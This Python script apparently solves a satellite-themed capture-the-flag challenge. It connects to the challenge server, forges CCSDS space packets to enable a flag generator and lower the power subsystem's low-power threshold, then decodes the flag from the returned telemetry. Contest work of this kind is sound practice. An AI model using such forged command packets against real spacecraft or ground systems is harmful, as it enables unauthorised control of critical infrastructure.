#!/bin/python3

import bitstring
import os
import sys
import socket
import random
import time

FLAG_APID = 102
EPS_APID = 103
PAYLOAD_APID = 105


class cmdSender:

    def __init__(self, APID):

        self.packet_version = 0
        self.packet_type = 1 #command
        self.sec_header_flag = 0 # no secondary header
        self.APID = APID
        self.sequence_flags = 3 # its a complete packet, not fragmented
        self.packet_sequence_count = random.randint(1000, 10000)
        self.packet_data_length = 1



    def sendCMD(self, socket, payload):

        self.packet_data_length = len(payload) - 1
        
        packet = bitstring.pack('uint:3, uint:1, uint:1, uint:11, uint:2, uint:14, uint:16',
            self.packet_version, self.packet_type, self.sec_header_flag, self.APID, self.sequence_flags,
            self.packet_sequence_count, self.packet_data_length)

        packethdr = packet.tobytes()

        wholepacket = packethdr + payload

        self.packet_sequence_count += 1


        socket.send(wholepacket)

        return True


# def readSpacePacket():


#     fd = sys.stdin.fileno()

#     packet_header = os.read(fd, 6)

#     if len(packet_header) == 0:
#         return

#     packet_header_bitstring = bitstring.BitArray(packet_header)

#     packet_version, packet_type, \
#     sec_header_flag, \
#     APID, \
#     sequence_flags, \
#     sequence_count, \
#     data_length = packet_header_bitstring.unpack('uint:3, uint:1, uint:1, uint:11, uint:2, uint:14, uint:16')


#     packet_data = os.read(fd, data_length+1)

#     return packet_header + packet_data


if __name__ == '__main__':
    Host = os.getenv("HOST", "localhost")
    Port = int(os.getenv("PORT", 31337))
    
    print(Host,Port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((Host, Port))
    # fsock = sock.makefile('rw')
    
    ticket = os.getenv("TICKET", "")
    if len(ticket):
        sock.recv(len("Ticket please:\n"))
        sock.send((ticket+"\n").encode('utf-8'))
        print("Sent: " + ticket)


    line = sock.recv(256)
    sock.close()
    
    Host, Port = line.split(b" ")[-1].split(b":")
    print(Host,Port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((Host, int(Port)))
    time.sleep(1)

    # first enable the flag generator
    cmd = cmdSender(EPS_APID)

    time.sleep(1)

    cmd.sendCMD(sock, b'\x00\x02\x01')

    time.sleep(1)

    # now lower the low_pwr_threshold so that subsystem will come on
    cmd.sendCMD(sock, b'\x00\x0c\x03\xde')


    while True:

        data = sock.recv(6)

        s = bitstring.BitArray(data)

        version, type, sec_header, apid, sequence_flags, sequence_count, data_length = s.unpack('uint:3, uint:1, uint:1, uint:11, uint:2, uint:14, uint:16')

        print("APID: {}\nLength: {}\n".format(apid, data_length))

        data = sock.recv(data_length+1)

        if apid != FLAG_APID:
            print("Ignoring APID we don't care about")
            continue

        s = bitstring.ConstBitStream(data)

        char = ' '
        flag = ''

        while char != '}':

            char = chr(s.read('uint:7'))

            flag += char

        print(flag)
        break


    
